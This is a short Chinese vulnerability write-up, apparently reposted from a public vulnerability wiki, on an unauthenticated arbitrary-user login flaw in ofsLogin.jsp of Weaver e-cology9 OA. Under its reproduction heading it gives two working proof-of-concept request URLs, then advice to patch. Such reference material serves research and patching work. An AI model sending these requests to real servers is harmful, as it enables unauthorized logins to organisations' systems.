---
title: "泛微OA E-Cology ofsLogin.jsp 前台任意用户登录漏洞"
date: 2026-10-17 09:12:30
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "漏洞复现"
---
## 漏洞描述

泛微 e-cology 前台任意用户登录漏洞：泛微 e-cology9 部分版本中存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。

## 漏洞影响

```
部分 e-cology9 且补丁版本 < 10.57
```

## 漏洞复现

poc1

```
/mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird=
```

poc2

```
/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp
```

## 漏洞修复

目前，官方已发布修复建议，建议受影响的用户尽快升级至最新版本的补丁。下载地址：https://www.weaver.com.cn/cs/securityDownload.asp#

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-ofsLogin.jsp-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md)
